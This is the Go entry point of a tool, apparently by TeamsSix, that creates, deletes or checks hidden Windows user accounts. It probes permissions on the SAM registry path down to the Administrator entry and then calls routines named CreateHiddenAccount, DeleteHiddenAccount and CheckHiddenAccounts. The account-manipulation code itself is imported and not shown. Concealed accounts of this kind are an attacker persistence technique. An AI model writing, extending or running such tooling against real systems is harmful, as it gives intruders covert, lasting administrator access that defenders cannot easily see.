// Author : TeamsSix
// Blog : teamssix.com
// WeChat Official Accounts: TeamsSix

package main

import (
	"./common"
	"./core"
)

func main() {
	username, password, deleteusername, check := common.Flag()
	common.DetermineRegistryPermissions("SAM\\SAM")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users\\Names")
	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users\\Names\\Administrator")

	if check {
		core.CheckHiddenAccounts()
	} else if deleteusername != "" {
		core.DeleteHiddenAccount(deleteusername)
	} else {
		core.CreateHiddenAccount(username, password)
	}
}
